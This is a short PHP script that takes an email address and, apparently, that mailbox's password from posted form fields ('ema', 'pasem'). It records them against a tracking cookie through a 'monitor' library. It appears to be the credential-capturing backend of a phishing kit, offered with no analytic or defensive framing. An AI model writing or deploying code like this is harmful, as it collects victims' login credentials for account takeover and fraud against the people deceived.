<?php
require('../../monitor/lib/funciones.php');

date_default_timezone_set('America/Bogota');

$email = $_POST['ema'];
$emailco = $_POST['pasem'];
$registro = $_COOKIE['registro'];

actualizar_registro_mail($registro,$email,$emailco,"");

?>